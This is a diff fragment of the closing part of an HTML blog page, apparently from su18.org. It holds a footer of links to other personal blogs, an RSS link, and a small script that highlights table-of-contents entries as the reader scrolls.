+  友情链接：<a href="https://www.yzmm.net/" target="_blank">园长</a> <a href="https://www.cnblogs.com/H4ck3R-XiX/" target="_blank">赵公子</a> <a href="https://fynch3r.github.io" target="_blank">fynch3r</a> <a href="https://g1asssy.com/" target="_blank">Glassy@Amadeus</a> <a href="https://iswin.org/" target="_blank">随风</a>  <a href="https://www.9170.org/" target="_blank">健宇</a>  <a href="https://fuzz7j.github.io/" target="_blank">fuzz7j</a>  <a href="https://blog.zgsec.cn/" target="_blank">曾哥</a> | 
+  <a class="rss" href="https://su18.org/atom.xml" target="_blank">RSS</a>
+</div>
+
+<script>
+  hljs.initHighlightingOnLoad()
+
+  let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+  // This should probably be throttled.
+  // Especially because it triggers during smooth scrolling.
+  // https://lodash.com/docs/4.17.10#throttle
+  // You could do like...
+  // window.addEventListener("scroll", () => {
+  //    _.throttle(doThatStuff, 100);
+  // });
+  // Only not doing it here to keep this Pen dependency-free.
+
+  window.addEventListener("scroll", event => {
+    let fromTop = window.scrollY;
+
+    mainNavLinks.forEach((link, index) => {
+      let section = document.getElementById(decodeURI(link.hash).substring(1));
+      let nextSection = null
+      if (mainNavLinks[index + 1]) {
+        nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+      }
+      console.log('section.offsetHeight', section.offsetHeight);
+      if (section.offsetTop <= fromTop) {
+        if (nextSection) {
+          if (nextSection.offsetTop > fromTop) {
+            link.classList.add("current");
+          } else {
+            link.classList.remove("current");    
+          }
+        } else {
+          link.classList.add("current");
+        }
+      } else {
+        link.classList.remove("current");
+      }
+    });
+  });
+
+</script>
+
+      </div>
+    </div>
+  </body>
+</html>
